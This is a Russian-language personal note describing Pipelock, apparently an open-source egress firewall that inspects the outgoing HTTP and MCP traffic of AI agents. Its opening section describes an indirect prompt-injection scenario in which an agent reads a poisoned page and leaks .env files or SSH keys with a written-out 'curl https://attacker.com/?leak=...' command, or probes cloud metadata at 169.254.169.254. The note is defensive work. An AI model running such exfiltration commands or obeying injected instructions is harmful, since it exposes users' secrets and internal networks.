---
title: "Pipelock: Open-Source файрвол для AI-агентов, MCP-серверов и верифицируемого Egress-контроля"
repo: "https://github.com/luckyPipewrench/pipelock"
category: "05_security_osint_and_guardrails"
tags: [agent-firewall, egress-control, mcp-security, ssrf-prevention, prompt-injection, tcb, mediator-receipts, go, cncf]
stars: "830+"
date: 2026-09-04
---

# 🛡️ Pipelock: Open-Source файрвол для AI-агентов и верифицируемого Egress-контроля

> **Ссылка на репозиторий:** [https://github.com/luckyPipewrench/pipelock](https://github.com/luckyPipewrench/pipelock)  
> **Организация:** Pipelab (входит в CNCF Landscape: Security & Compliance)  
> **Слоган:** *«Verifiable Egress Control for AI Agents»*  
> **Звёзды GitHub:** 830+ ★  
> **Стек:** Go 1.25+, MIT / Enterprise Dual, eBPF / HTTP Proxy / MCP Bridge  
> **Лицензия:** Apache-2.0  

---

## 🎯 1. В чем главная проблема и зачем нужен Pipelock?

Когда автономный агент (Claude Code, Codex, Devika, AutoGPT) получает доступ к инструментам (MCP, bash, HTTP), он может стать жертвой **косвенной инъекции промпта (Indirect Prompt Injection)**:
1. Агент читает внешний сайт или тикет в Jira, где спрятан вредоносный промпт.
2. Модель попадает под влияние инъекции и пытается слить файл `.env` или SSH-ключи наружу через `curl https://attacker.com/?leak=...`.
3. Или агент сканирует внутреннюю сеть компании (атака SSRF на `http://169.254.169.254`).

**Pipelock** ставится как **внешний Reference Monitor (прокси-файрвол)** между средой агента и внешней сетью:
Он физически перехватывает весь исходящий HTTP, WebSocket, A2A (Agent-to-Agent) и MCP-трафик, проверяя его на атаки до того, как пакет уйдет в сеть.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        PIPELOCK ARCHITECTURE                           │
│                                                                        │
│   ┌────────────────────────┐                                           │
│   │ AI Агент (Claude/Codex)│                                           │
│   └───────────┬────────────┘                                           │
│               │ (Любой исходящий сетевой запрос или MCP-вызов)         │
│               ▼                                                        │
│   ┌────────────────────────────────────────────────────────────────┐   │
│   │                   PIPELOCK EGRESS FIREWALL                     │   │
│   │ • Deep Packet Inspection (DPI) для HTTP / WebSocket / MCP      │   │
│   │ • Детектирование SSRF и блокировка облачных метаданных         │   │
│   │ • Детектирование скрытых секретов в теле запроса               │   │
│   │ • Проверка цепочек опасных тулов (Tool-Poisoning)              │   │
│   └───────────────────────────────┬────────────────────────────────┘   │
│                                   │                                    │
│             ┌─────────────────────┴─────────────────────┐              │
│             ▼ (Угроза обнаружена)                       ▼ (Легитимно)  │
│      [ 🛑 DROP & ALARM ]                        [ 🚀 Внешняя сеть ]    │
│   • Агент блокируется                     • Генерируется подписанный   │
│   • Запрос аннулируется                     чек: Mediator-Signed       │
│                                             Action Receipt             │
└────────────────────────────────────────────────────────────────────────┘
```

---

## 💎 2. Ключевые возможности

1. **Mediator-Signed Action Receipts (Криптографические квитанции):**  
   Pipelock не просто пропускает запрос, а подписывает каждый легитимный вызов приватным ключом медиатора. Это дает **неопровержимое доказательство аудита** для комплаенса: вы можете доказать регуляторам, какие именно действия агент действительно выполнял во внешней сети.
2. **Инспекция MCP-протокола (Model Context Protocol):**  
   Анализирует JSON-RPC вызовы между агентом и тул-серверами. Блокирует подмену параметров и несанкционированные вызовы опасных функций.
3. **Обнаружение утечки секретов на лету:**  
   Сканирует исходящие тела запросов регулярными выражениями и энтропийными детекторами на наличие AWS ключей, приватных RSA-ключей, токенов GitHub и паролей.
4. **Защита от SSRF и DNS Rebinding:**  
   Резолвит домены и гарантирует, что запросы не пойдут на loopback (`127.0.0.1`), link-local (`169.254.169.254`) или частные подсети RFC 1918.

---

## 🚀 3. Быстрый запуск

```bash
# Установка бинарника Pipelock
curl -fsSL https://get.pipelab.org/pipelock | bash

# Запуск прокси-файрвола на порту 8080 с политикой strict-egress
pipelock daemon --listen :8080 --policy ./policies/strict-egress.yaml

# Запуск агента через защитный шлюз
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080
claude-code
```

---
*Заметка сохранена: 2026-09-04 в /home/blackzeshi/Documents/Notes/05_security_osint_and_guardrails/pipelock.md*
